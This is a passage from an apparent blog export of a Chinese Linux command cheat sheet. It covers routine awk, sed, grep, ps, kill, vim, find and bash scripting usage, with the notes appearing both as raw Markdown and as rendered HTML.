三、grep命令\n\n### 1. 查找特定文件指定字符串\n`grep \"no object DCH for MIME type multipart/mixed\" *.log > MIME.log`\n\n\n### 2. 查找文本内容\n`grep -i -r --exclude=*.jar --exclude=*.log* noah .`\n\n\n### 3. 查看tomcat日志特定内容\n`tail -f catalina.out | grep timecost | grep FamilyController | awk '{if($10 > 100) print $0}'`\n\n\n### 4. 查看tomcat某天日志\n`tail -800000 catalina.out | grep 2014-06-30 > 2014-06-30.log`\n\n\n### 5. 记录统计\n``` shell\ngrep timecost file.txt | wc -l\nls | wc -l\n```\n\n### 6. grep与或非\n\n#### 与操作\n``` shell\ngrep -E 'pattern1.*pattern2' file.txt # in that order\ngrep -E 'pattern1.*pattern2|pattern2.*pattern1' file.txt # in any order\ngrep 'pattern1' file.txt | grep 'pattern2' # in any order\n```\n\n#### 或操作\n``` shell\ngrep \"pattern1\\|pattern2\" file.txt\ngrep -E \"pattern1|pattern2\" file.txt\ngrep -e pattern1 -e pattern2 file.txt\negrep \"pattern1|pattern2\" file.txt\n```\n\n#### 非操作\n``` bash\ngrep -v 'pattern1' file.txt\n```\n\n摘自：[Using BASH \"Grep OR / Grep AND / Grep NOT\" Operators](http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators)\n\n\n### 7. 递归查询不包含指定内容的文件\n``` shell\ngrep -irL \"date:\" file.txt\n```\n\n\n<!-- more -->\n\n\n## 四、ps命令\n\n### 1. cpu/内存占用率排序\n``` bash\nps auxw --sort=%cpu\nps auxw --sort=%mem\n```\n\n### 2. 查看端口占用\n``` bash\nlsof -i:8080\nps -aux | grep java\nps -aux | grep pid\n```\n\n## 五、kill命令\n\n### 1. 批量关闭进程\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v 'grep' | awk {'print $2'}`\n```\n\n### 2. 进程批量中止\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v grep | awk {'print $2'}`\n```\n\n## 六、vim命令\n\n### 1. vim显示/隐藏行号\n``` vim\n:set nu 或 :set number\n:set nonu 或 :set nonumber\n```\n\n### 2. vim替换指定区域匹配文本\n``` vim\n: 41,57 s/10.13.92.143/10.13.92.157/g\n```\n\n## 七、date命令\n\n### 1. 打印时间\n``` bash\necho `date '+%Y-%m-%d %H:%M:%S'`\n```\n\n### 2. 时间显示\n``` bash\ndate\ndate '+%Y-%m-%d %H:%M:%S'\n```\n\n## 八、cal命令\n\n### 1. 当年当月\n`cal`\n\n### 2. 某年日历\n`cal 2015`\n\n### 3. 某年某月\n`cal 12 2015`\n\n\n## 九、ls命令\n\n### 1. linux 下查看文件个数及大小\n`ls -l |grep \"^-\"|wc -l 或 find ./company -type f | wc -l`\n\n### 2. 查看某文件夹下文件的个数，包括子文件夹里的。\n`ls -lR|grep \"^-\"|wc -l`\n\n### 3. 查看某文件夹下文件夹的个数，包括子文件夹里的。\n`ls -lR|grep \"^d\"|wc -l`\n\n### 4. 按修改先后，列出文件\n`ls -lt`\n\n\n## 十、tar命令\n\n### 1. tar打包文件，exclude选项排除指定文件或目录\n`tar zcvf ../fetch-wiki.tar.gz * --exclude=*.txt* --exclude=logs`\n\n\n## 十一、rm命令\n\n### 1. 删除 - 开头的文件\n``` shell\nrm --  -filename\nrm -- ./-filename\n```\n\n\n## 十二、echo命令\n\n### 1. echo输出制表符方式\n`echo -e \"123\\t345\"`\n\n\n### 2. shell换行\n``` bash\necho -e \"123\\n34\"\n```\n\n**注**：-e 表示特殊处理字符串里的特殊字符。\n\n\n## 十三、tail语法\n\n### 1. 查找特定字符串在文件中出现位置\n`tail -2000000 catalina.out | cat -n | grep \"2014-07-10\" | head  -2 (对于出现在文末)`\n\n\n## 十四、shell语法\n\n### 1. 批量解压zip文件\n`for z in ./*.zip; do unzip -o $z -d ./peixun-logger ; done;`\n\n### 2. 判断shell脚本输入参数个数\n`if [ $# -eq 0 ]; then`\n\n\n### 3. 逐行读取文本文件的 shell 脚本\n``` shell\nwhile read line\ndo\necho $line\ndone < $1\n```\n\n### 4. for循环\n``` shell\nfor index in {1..31}\ndo\n    ……\ndone\n```\n\n### 5. shell注释\n``` shell\n:&lt;&lt;comment\n这里是个注释哈。\ncomment\n```\n\n### 6. 获取shell脚本位置/当前脚本目录\n不能解决软链接问题：`$(cd \"$(dirname \"$0\")\"; pwd)`\n最靠谱，能处理软链接的情况以及source加载脚本的情况：`echo $( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )`\n\n\n### 7. 查看当前bash shell版本\necho $BASH_VERSION\n\n\n### 8. 理解 bashrc 和 profile\n参见：[理解 bashrc 和 profile](https://wido.me/sunteya/understand-bashrc-and-profile)\n\n#### login shell 和 no-login shell\n“login shell” 代表用户登入, 比如使用 “su -“ 命令, 或者用 ssh 连接到某一个服务器上, 都会使用该用户默认 shell 启动 login shell 模式.\n该模式下的 shell 会去自动执行 /etc/profile 和 ~/.profile 文件, 但不会执行任何的 bashrc 文件, 所以一般再 /etc/profile 或者 ~/.profile 里我们会手动去 source bashrc 文件.\n而 no-login shell 的情况是我们在终端下直接输入 bash 或者 bash -c “CMD” 来启动的 shell.\n该模式下是不会自动去运行任何的 profile 文件.\n\n#### interactive shell 和 non-interactive shell\ninteractive shell 是交互式shell, 顾名思义就是用来和用户交互的, 提供了命令提示符可以输入命令.\n该模式下会存在一个叫 PS1 的环境变量, 如果还不是 login shell 的则会去 source /etc/bash.bashrc 和 ~/.bashrc 文件\nnon-interactive shell 则一般是通过 bash -c “CMD” 来执行的bash.\n该模式下不会执行任何的 rc 文件, 不过还存在一种特殊情况这个我之后详细讲述\n\n#### bashrc 和 profile 的区别\n看了之前那么多种状态组合, 最关键的问题是, 究竟 bashrc 和 profile 有什么区别呢?\n\n**profile**\n其实看名字就能了解大概了, profile 是某个用户唯一的用来设置环境变量的地方, 因为用户可以有多个 shell 比如 bash, sh, zsh 之类的, 但像环境变量这种其实只需要在统一的一个地方初始化就可以了, 而这就是 profile.\n\n**bashrc**\nbashrc 也是看名字就知道, 是专门用来给 bash 做初始化的比如用来初始化 bash 的设置, bash 的代码补全, bash 的别名, bash 的颜色. 以此类推也就还会有 shrc, zshrc 这样的文件存在了, 只是 bash 太常用了而已.\n\n\n### 9. 上条命令是否成功执行\n``` bash\nEXCODE=$?\nif [ \"$EXCODE\" == \"0\" ]; then\necho \"O.K\"\nelse\necho \"NOT O.K\"\nfi\n```\n\n### 10. 加载配置\n``` shell\n. slave.conf\nsource slave.conf\n```\n\n**注**：slave.conf里的值格式为K=V\n\n### 11. 执行字符串命令\n``` shell\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n```\n\n**注**：\n\\$要转义处理执行\n执行字符串里的命令，使用eval命令\n获取命令执行结果，可以用$()把命令包里来。\n\n\n### 12. 获取某文件路径文件名\nbasename soft_install/jenkins-job-install/archive/jdk1.7.0_60.tar.gz .tar.gz => jdk1.7.0_60\n\n\n## 十五、find命令\n\n### 1. 删除所有文件名包含Ulysses-Group的文件\n`find . -name \"*Ulysses-Group*\" -exec rm -rf {} \\;`\n\n\n## 十六、其他命令\n\n### 1. 磁盘格式转换为ntfs( 会格式化磁盘 )\n`convert X: /fs:ntfs`\n\n### 2. 命令后台处理\n`nohup command &`\n\n### 3. 重启ibus\n``` shell\nkillall ibus-daemon\nibus-daemon -drx\n```\n\n### 4. 查看用户使用的shell版本\nfinger [USERNAME]\n\n### 5. tee\n重定向到文件并打印到屏幕\n\n参见：[tee--重定向到文件并打印到屏幕](http://blog.csdn.net/love_gaohz/article/details/8100808)\n\n\n","source":"_posts/article/linux/Linux命令小记.md","raw":"categories:\n  - 工具软件\ntags:\n  - 命令\n  - 小记\n  - ubuntu\ntitle: Linux命令小记\ndate: 2016-01-15 18:02:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、awk命令\n\n### 1. 删除重复的、非连续的行\n``` shell\n`awk '! a[$0]++'`\n```\n\n\n### 2. awk使用特殊分隔符分隔列\n``` shell\necho \"192.168.102.134\" | awk -F . '{print $4}'\n```\n\n\n## 二、sed命令\n\n### 1. 截取程序日志中某个时间范围内的文本\n``` shell\nsed -n '/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p' access_log > log.txt\n```\n\n### 2. 去除空白行的sed\n``` shell\nSECRET=`sed '/^$/d' file.txt | head -1`\n```\n\n### 3. 通过sed替换字特殊字符\n`echo \"12,34,56\" | sed 's/,/ /g'`\n\n\n### 4. 通过sed替换二者之间的字符串内容\n文本内容：\n``` xml\n<server   id=\"film-web\"   address=\"127.0.0.1\" port=\"6881\">\n</server>\n```\n\n``` shell\nsed -n \"s/\\( *server.*port=\\\"\\).*\\(\\\".*\\)/\\1abc\\2/p\" 1.txt\nsed -n \"s/\\( *server.*address=\\\"\\).*\\(\\\" *port\\)/\\1abc\\2/p\" 1.txt\n```\n\n**注**：sed里，使用圆括号括起来的内容，可以看做是变量。使用\\1和\\2来输出。\n**参见**：http://coolshell.cn/articles/9104.html 圆括号匹配\n\n\n### 5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容\n``` shell\nsed -i \"/ *server *id=/,\\${s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18000\\2/g;}\" resin.conf\nsed \"/ *server *id=\\\"/,/<\\/server>/{s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18888\\2/g;}\" resin.conf\n```\n\n**注**：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/\n\n\n## 三、grep命令\n\n### 1. 查找特定文件指定字符串\n`grep \"no object DCH for MIME type multipart/mixed\" *.log > MIME.log`\n\n\n### 2. 查找文本内容\n`grep -i -r --exclude=*.jar --exclude=*.log* noah .`\n\n\n### 3. 查看tomcat日志特定内容\n`tail -f catalina.out | grep timecost | grep FamilyController | awk '{if($10 > 100) print $0}'`\n\n\n### 4. 查看tomcat某天日志\n`tail -800000 catalina.out | grep 2014-06-30 > 2014-06-30.log`\n\n\n### 5. 记录统计\n``` shell\ngrep timecost file.txt | wc -l\nls | wc -l\n```\n\n### 6. grep与或非\n\n#### 与操作\n``` shell\ngrep -E 'pattern1.*pattern2' file.txt # in that order\ngrep -E 'pattern1.*pattern2|pattern2.*pattern1' file.txt # in any order\ngrep 'pattern1' file.txt | grep 'pattern2' # in any order\n```\n\n#### 或操作\n``` shell\ngrep \"pattern1\\|pattern2\" file.txt\ngrep -E \"pattern1|pattern2\" file.txt\ngrep -e pattern1 -e pattern2 file.txt\negrep \"pattern1|pattern2\" file.txt\n```\n\n#### 非操作\n``` bash\ngrep -v 'pattern1' file.txt\n```\n\n摘自：[Using BASH \"Grep OR / Grep AND / Grep NOT\" Operators](http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators)\n\n\n### 7. 递归查询不包含指定内容的文件\n``` shell\ngrep -irL \"date:\" file.txt\n```\n\n\n<!-- more -->\n\n\n## 四、ps命令\n\n### 1. cpu/内存占用率排序\n``` bash\nps auxw --sort=%cpu\nps auxw --sort=%mem\n```\n\n### 2. 查看端口占用\n``` bash\nlsof -i:8080\nps -aux | grep java\nps -aux | grep pid\n```\n\n## 五、kill命令\n\n### 1. 批量关闭进程\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v 'grep' | awk {'print $2'}`\n```\n\n### 2. 进程批量中止\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v grep | awk {'print $2'}`\n```\n\n## 六、vim命令\n\n### 1. vim显示/隐藏行号\n``` vim\n:set nu 或 :set number\n:set nonu 或 :set nonumber\n```\n\n### 2. vim替换指定区域匹配文本\n``` vim\n: 41,57 s/10.13.92.143/10.13.92.157/g\n```\n\n## 七、date命令\n\n### 1. 打印时间\n``` bash\necho `date '+%Y-%m-%d %H:%M:%S'`\n```\n\n### 2. 时间显示\n``` bash\ndate\ndate '+%Y-%m-%d %H:%M:%S'\n```\n\n## 八、cal命令\n\n### 1. 当年当月\n`cal`\n\n### 2. 某年日历\n`cal 2015`\n\n### 3. 某年某月\n`cal 12 2015`\n\n\n## 九、ls命令\n\n### 1. linux 下查看文件个数及大小\n`ls -l |grep \"^-\"|wc -l 或 find ./company -type f | wc -l`\n\n### 2. 查看某文件夹下文件的个数，包括子文件夹里的。\n`ls -lR|grep \"^-\"|wc -l`\n\n### 3. 查看某文件夹下文件夹的个数，包括子文件夹里的。\n`ls -lR|grep \"^d\"|wc -l`\n\n### 4. 按修改先后，列出文件\n`ls -lt`\n\n\n## 十、tar命令\n\n### 1. tar打包文件，exclude选项排除指定文件或目录\n`tar zcvf ../fetch-wiki.tar.gz * --exclude=*.txt* --exclude=logs`\n\n\n## 十一、rm命令\n\n### 1. 删除 - 开头的文件\n``` shell\nrm --  -filename\nrm -- ./-filename\n```\n\n\n## 十二、echo命令\n\n### 1. echo输出制表符方式\n`echo -e \"123\\t345\"`\n\n\n### 2. shell换行\n``` bash\necho -e \"123\\n34\"\n```\n\n**注**：-e 表示特殊处理字符串里的特殊字符。\n\n\n## 十三、tail语法\n\n### 1. 查找特定字符串在文件中出现位置\n`tail -2000000 catalina.out | cat -n | grep \"2014-07-10\" | head  -2 (对于出现在文末)`\n\n\n## 十四、shell语法\n\n### 1. 批量解压zip文件\n`for z in ./*.zip; do unzip -o $z -d ./peixun-logger ; done;`\n\n### 2. 判断shell脚本输入参数个数\n`if [ $# -eq 0 ]; then`\n\n\n### 3. 逐行读取文本文件的 shell 脚本\n``` shell\nwhile read line\ndo\necho $line\ndone < $1\n```\n\n### 4. for循环\n``` shell\nfor index in {1..31}\ndo\n    ……\ndone\n```\n\n### 5. shell注释\n``` shell\n:&lt;&lt;comment\n这里是个注释哈。\ncomment\n```\n\n### 6. 获取shell脚本位置/当前脚本目录\n不能解决软链接问题：`$(cd \"$(dirname \"$0\")\"; pwd)`\n最靠谱，能处理软链接的情况以及source加载脚本的情况：`echo $( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )`\n\n\n### 7. 查看当前bash shell版本\necho $BASH_VERSION\n\n\n### 8. 理解 bashrc 和 profile\n参见：[理解 bashrc 和 profile](https://wido.me/sunteya/understand-bashrc-and-profile)\n\n#### login shell 和 no-login shell\n“login shell” 代表用户登入, 比如使用 “su -“ 命令, 或者用 ssh 连接到某一个服务器上, 都会使用该用户默认 shell 启动 login shell 模式.\n该模式下的 shell 会去自动执行 /etc/profile 和 ~/.profile 文件, 但不会执行任何的 bashrc 文件, 所以一般再 /etc/profile 或者 ~/.profile 里我们会手动去 source bashrc 文件.\n而 no-login shell 的情况是我们在终端下直接输入 bash 或者 bash -c “CMD” 来启动的 shell.\n该模式下是不会自动去运行任何的 profile 文件.\n\n#### interactive shell 和 non-interactive shell\ninteractive shell 是交互式shell, 顾名思义就是用来和用户交互的, 提供了命令提示符可以输入命令.\n该模式下会存在一个叫 PS1 的环境变量, 如果还不是 login shell 的则会去 source /etc/bash.bashrc 和 ~/.bashrc 文件\nnon-interactive shell 则一般是通过 bash -c “CMD” 来执行的bash.\n该模式下不会执行任何的 rc 文件, 不过还存在一种特殊情况这个我之后详细讲述\n\n#### bashrc 和 profile 的区别\n看了之前那么多种状态组合, 最关键的问题是, 究竟 bashrc 和 profile 有什么区别呢?\n\n**profile**\n其实看名字就能了解大概了, profile 是某个用户唯一的用来设置环境变量的地方, 因为用户可以有多个 shell 比如 bash, sh, zsh 之类的, 但像环境变量这种其实只需要在统一的一个地方初始化就可以了, 而这就是 profile.\n\n**bashrc**\nbashrc 也是看名字就知道, 是专门用来给 bash 做初始化的比如用来初始化 bash 的设置, bash 的代码补全, bash 的别名, bash 的颜色. 以此类推也就还会有 shrc, zshrc 这样的文件存在了, 只是 bash 太常用了而已.\n\n\n### 9. 上条命令是否成功执行\n``` bash\nEXCODE=$?\nif [ \"$EXCODE\" == \"0\" ]; then\necho \"O.K\"\nelse\necho \"NOT O.K\"\nfi\n```\n\n### 10. 加载配置\n``` shell\n. slave.conf\nsource slave.conf\n```\n\n**注**：slave.conf里的值格式为K=V\n\n### 11. 执行字符串命令\n``` shell\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n```\n\n**注**：\n\\$要转义处理执行\n执行字符串里的命令，使用eval命令\n获取命令执行结果，可以用$()把命令包里来。\n\n\n### 12. 获取某文件路径文件名\nbasename soft_install/jenkins-job-install/archive/jdk1.7.0_60.tar.gz .tar.gz => jdk1.7.0_60\n\n\n## 十五、find命令\n\n### 1. 删除所有文件名包含Ulysses-Group的文件\n`find . -name \"*Ulysses-Group*\" -exec rm -rf {} \\;`\n\n\n## 十六、其他命令\n\n### 1. 磁盘格式转换为ntfs( 会格式化磁盘 )\n`convert X: /fs:ntfs`\n\n### 2. 命令后台处理\n`nohup command &`\n\n### 3. 重启ibus\n``` shell\nkillall ibus-daemon\nibus-daemon -drx\n```\n\n### 4. 查看用户使用的shell版本\nfinger [USERNAME]\n\n### 5. tee\n重定向到文件并打印到屏幕\n\n参见：[tee--重定向到文件并打印到屏幕](http://blog.csdn.net/love_gaohz/article/details/8100808)\n\n\n","slug":"article/linux/Linux命令小记","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsy004b5nbt3qcy6kl0","content":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、awk命令\"><a href=\"#一、awk命令\" class=\"headerlink\" title=\"一、awk命令\"></a>一、awk命令</h2><h3 id=\"1-删除重复的、非连续的行\"><a href=\"#1-删除重复的、非连续的行\" class=\"headerlink\" title=\"1. 删除重复的、非连续的行\"></a>1. 删除重复的、非连续的行</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">`awk &apos;! a[$0]++&apos;`</div></pre></td></tr></table></figure>\n<h3 id=\"2-awk使用特殊分隔符分隔列\"><a href=\"#2-awk使用特殊分隔符分隔列\" class=\"headerlink\" title=\"2. awk使用特殊分隔符分隔列\"></a>2. awk使用特殊分隔符分隔列</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">echo &quot;192.168.102.134&quot; | awk -F . &apos;&#123;print $4&#125;&apos;</div></pre></td></tr></table></figure>\n<h2 id=\"二、sed命令\"><a href=\"#二、sed命令\" class=\"headerlink\" title=\"二、sed命令\"></a>二、sed命令</h2><h3 id=\"1-截取程序日志中某个时间范围内的文本\"><a href=\"#1-截取程序日志中某个时间范围内的文本\" class=\"headerlink\" title=\"1. 截取程序日志中某个时间范围内的文本\"></a>1. 截取程序日志中某个时间范围内的文本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sed -n &apos;/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p&apos; access_log &gt; log.txt</div></pre></td></tr></table></figure>\n<h3 id=\"2-去除空白行的sed\"><a href=\"#2-去除空白行的sed\" class=\"headerlink\" title=\"2. 去除空白行的sed\"></a>2. 去除空白行的sed</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">SECRET=`sed &apos;/^$/d&apos; file.txt | head -1`</div></pre></td></tr></table></figure>\n<h3 id=\"3-通过sed替换字特殊字符\"><a href=\"#3-通过sed替换字特殊字符\" class=\"headerlink\" title=\"3. 通过sed替换字特殊字符\"></a>3. 通过sed替换字特殊字符</h3><p><code>echo &quot;12,34,56&quot; | sed &#39;s/,/ /g&#39;</code></p>\n<h3 id=\"4-通过sed替换二者之间的字符串内容\"><a href=\"#4-通过sed替换二者之间的字符串内容\" class=\"headerlink\" title=\"4. 通过sed替换二者之间的字符串内容\"></a>4. 通过sed替换二者之间的字符串内容</h3><p>文本内容：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">server</span>   <span class=\"attr\">id</span>=<span class=\"string\">\"film-web\"</span>   <span class=\"attr\">address</span>=<span class=\"string\">\"127.0.0.1\"</span> <span class=\"attr\">port</span>=<span class=\"string\">\"6881\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">server</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sed -n &quot;s/\\( *server.*port=\\&quot;\\).*\\(\\&quot;.*\\)/\\1abc\\2/p&quot; 1.txt</div><div class=\"line\">sed -n &quot;s/\\( *server.*address=\\&quot;\\).*\\(\\&quot; *port\\)/\\1abc\\2/p&quot; 1.txt</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：sed里，使用圆括号括起来的内容，可以看做是变量。使用\\1和\\2来输出。<br><strong>参见</strong>：<a href=\"http://coolshell.cn/articles/9104.html\" target=\"_blank\" rel=\"external\">http://coolshell.cn/articles/9104.html</a> 圆括号匹配</p>\n<h3 id=\"5-从替换开始匹配行到行尾或结束匹配行区间内替换内容\"><a href=\"#5-从替换开始匹配行到行尾或结束匹配行区间内替换内容\" class=\"headerlink\" title=\"5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容\"></a>5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sed -i &quot;/ *server *id=/,\\$&#123;s/\\(\\&lt;watchdog-port&gt;\\).*\\(&lt;\\/watchdog-port&gt;\\)/\\18000\\2/g;&#125;&quot; resin.conf</div><div class=\"line\">sed &quot;/ *server *id=\\&quot;/,/&lt;\\/server&gt;/&#123;s/\\(\\&lt;watchdog-port&gt;\\).*\\(&lt;\\/watchdog-port&gt;\\)/\\18888\\2/g;&#125;&quot; resin.conf</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/</p>\n<h2 id=\"三、grep命令\"><a href=\"#三、grep命令\" class=\"headerlink\" title=\"三、grep命令\"></a>三、grep命令</h2><h3 id=\"1-查找特定文件指定字符串\"><a href=\"#1-查找特定文件指定字符串\" class=\"headerlink\" title=\"1. 查找特定文件指定字符串\"></a>1. 查找特定文件指定字符串</h3><p><code>grep &quot;no object DCH for MIME type multipart/mixed&quot; *.log &gt; MIME.log</code></p>\n<h3 id=\"2-查找文本内容\"><a href=\"#2-查找文本内容\" class=\"headerlink\" title=\"2. 查找文本内容\"></a>2. 查找文本内容</h3><p><code>grep -i -r --exclude=*.jar --exclude=*.log* noah .</code></p>\n<h3 id=\"3-查看tomcat日志特定内容\"><a href=\"#3-查看tomcat日志特定内容\" class=\"headerlink\" title=\"3. 查看tomcat日志特定内容\"></a>3. 查看tomcat日志特定内容</h3><p><code>tail -f catalina.out | grep timecost | grep FamilyController | awk &#39;{if($10 &gt; 100) print $0}&#39;</code></p>\n<h3 id=\"4-查看tomcat某天日志\"><a href=\"#4-查看tomcat某天日志\" class=\"headerlink\" title=\"4. 查看tomcat某天日志\"></a>4. 查看tomcat某天日志</h3><p><code>tail -800000 catalina.out | grep 2014-06-30 &gt; 2014-06-30.log</code></p>\n<h3 id=\"5-记录统计\"><a href=\"#5-记录统计\" class=\"headerlink\" title=\"5. 记录统计\"></a>5. 记录统计</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep timecost file.txt | wc -l</div><div class=\"line\">ls | wc -l</div></pre></td></tr></table></figure>\n<h3 id=\"6-grep与或非\"><a href=\"#6-grep与或非\" class=\"headerlink\" title=\"6. grep与或非\"></a>6. grep与或非</h3><h4 id=\"与操作\"><a href=\"#与操作\" class=\"headerlink\" title=\"与操作\"></a>与操作</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep -E &apos;pattern1.*pattern2&apos; file.txt # in that order</div><div class=\"line\">grep -E &apos;pattern1.*pattern2|pattern2.*pattern1&apos; file.txt # in any order</div><div class=\"line\">grep &apos;pattern1&apos; file.txt | grep &apos;pattern2&apos; # in any order</div></pre></td></tr></table></figure>\n<h4 id=\"或操作\"><a href=\"#或操作\" class=\"headerlink\" title=\"或操作\"></a>或操作</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep &quot;pattern1\\|pattern2&quot; file.txt</div><div class=\"line\">grep -E &quot;pattern1|pattern2&quot; file.txt</div><div class=\"line\">grep -e pattern1 -e pattern2 file.txt</div><div class=\"line\">egrep &quot;pattern1|pattern2&quot; file.txt</div></pre></td></tr></table></figure>\n<h4 id=\"非操作\"><a href=\"#非操作\" class=\"headerlink\" title=\"非操作\"></a>非操作</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep -v <span class=\"string\">'pattern1'</span> file.txt</div></pre></td></tr></table></figure>\n<p>摘自：<a href=\"http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators\" target=\"_blank\" rel=\"external\">Using BASH “Grep OR / Grep AND / Grep NOT” Operators</a></p>\n<h3 id=\"7-递归查询不包含指定内容的文件\"><a href=\"#7-递归查询不包含指定内容的文件\" class=\"headerlink\" title=\"7. 递归查询不包含指定内容的文件\"></a>7. 递归查询不包含指定内容的文件</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">grep -irL &quot;date:&quot; file.txt</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"四、ps命令\"><a href=\"#四、ps命令\" class=\"headerlink\" title=\"四、ps命令\"></a>四、ps命令</h2><h3 id=\"1-cpu-内存占用率排序\"><a href=\"#1-cpu-内存占用率排序\" class=\"headerlink\" title=\"1. cpu/内存占用率排序\"></a>1. cpu/内存占用率排序</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">ps auxw --sort=%cpu</div><div class=\"line\">ps auxw --sort=%mem</div></pre></td></tr></table></figure>\n<h3 id=\"2-查看端口占用\"><a href=\"#2-查看端口占用\" class=\"headerlink\" title=\"2. 查看端口占用\"></a>2. 查看端口占用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">lsof -i:8080</div><div class=\"line\">ps -aux | grep java</div><div class=\"line\">ps -aux | grep pid</div></pre></td></tr></table></figure>\n<h2 id=\"五、kill命令\"><a href=\"#五、kill命令\" class=\"headerlink\" title=\"五、kill命令\"></a>五、kill命令</h2><h3 id=\"1-批量关闭进程\"><a href=\"#1-批量关闭进程\" class=\"headerlink\" title=\"1. 批量关闭进程\"></a>1. 批量关闭进程</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">kill</span> -9 `ps -ef | grep QQ | grep -v <span class=\"string\">'grep'</span> | awk &#123;<span class=\"string\">'print $2'</span>&#125;`</div></pre></td></tr></table></figure>\n<h3 id=\"2-进程批量中止\"><a href=\"#2-进程批量中止\" class=\"headerlink\" title=\"2. 进程批量中止\"></a>2. 进程批量中止</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">kill</span> -9 `ps -ef | grep QQ | grep -v grep | awk &#123;<span class=\"string\">'print $2'</span>&#125;`</div></pre></td></tr></table></figure>\n<h2 id=\"六、vim命令\"><a href=\"#六、vim命令\" class=\"headerlink\" title=\"六、vim命令\"></a>六、vim命令</h2><h3 id=\"1-vim显示-隐藏行号\"><a href=\"#1-vim显示-隐藏行号\" class=\"headerlink\" title=\"1. vim显示/隐藏行号\"></a>1. vim显示/隐藏行号</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">:<span class=\"keyword\">set</span> <span class=\"keyword\">nu</span> 或 :<span class=\"keyword\">set</span> <span class=\"keyword\">number</span></div><div class=\"line\">:<span class=\"keyword\">set</span> nonu 或 :<span class=\"keyword\">set</span> nonumber</div></pre></td></tr></table></figure>\n<h3 id=\"2-vim替换指定区域匹配文本\"><a href=\"#2-vim替换指定区域匹配文本\" class=\"headerlink\" title=\"2. vim替换指定区域匹配文本\"></a>2. vim替换指定区域匹配文本</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div 